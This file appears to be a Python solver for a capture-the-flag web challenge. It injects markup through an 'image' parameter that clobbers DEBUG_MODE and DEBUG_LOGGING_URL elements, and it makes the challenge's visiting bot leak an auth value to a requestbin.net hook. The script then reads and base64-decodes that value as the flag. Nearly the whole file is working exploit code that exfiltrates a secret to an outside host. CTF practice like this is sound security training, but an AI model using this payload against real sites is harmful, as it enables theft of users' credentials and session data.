import base64
import json
import requests
import sys
import urllib.parse

CHAL_URL = 'https://wsc-2022-web-2-bvel4oasra-uc.a.run.app/'
FLAG_PREFIX = 'wsc{'

def getHookUrls():
    url = 'https://requestbin.net/api/v1/bins'
    response = requests.post(url)
    if response.status_code != 200:
        print('Error in ', url, response.status_code, response.text)
        sys.exit(1)

    data = json.loads(response.text)
    name = data['name']
    hookUrl = f'https://requestbin.net/r/{name}/'
    readUrl = f'https://requestbin.net/r/{name}/?inspect'
    return (hookUrl, readUrl)

def solve():
    (hookUrl, readUrl) = getHookUrls()
    # print('hookUrl', hookUrl)
    # print('readUrl', readUrl)

    imageUrl = f'{hookUrl}my-fake-image"><p id="DEBUG_MODE"></p><a id="DEBUG_LOGGING_URL" href="{hookUrl}">hello</a><p alt="sam'

    urlToSubmit = CHAL_URL + 'personalize?image=' + urllib.parse.quote(imageUrl)
    url = CHAL_URL + 'visit'

    response = requests.post(url,
                             headers={'Content-Type': 'application/x-www-form-urlencoded'},
                             data={'url': urlToSubmit})

    if response.status_code != 200:
        print(url, response.status_code, response.text)
        sys.exit(1)

    if 'Our evaluator has viewed your image!' not in response.text:
        print(url, response.status_code, response.text)
        sys.exit(1)

    hookResponse = requests.get(readUrl)

    if hookResponse.status_code != 200:
        print(url, hookResponse.status_code)
        sys.exit(1)

    crib = '?auth='
    cribIndex = hookResponse.text.find('?auth=')
    if cribIndex < 0:
        print('Failed to find ', crib, 'in hookResponse.text')
        sys.exit(1)

    endCrib = '&amp;'
    endCribIndex = hookResponse.text.find(endCrib, cribIndex)
    if endCribIndex < 0:
        print('Failed to find ', endCrib, 'in hookResponse.text')
        sys.exit(1)

    b64Flag = hookResponse.text[cribIndex + len(crib) : endCribIndex]
    # print('b64Flag', b64Flag)

    flag = base64.b64decode(b64Flag).decode('ascii')
    if FLAG_PREFIX in flag:
        print('solved')
    else:
        print('Error: ', flag)
        sys.exit(1)


solve()
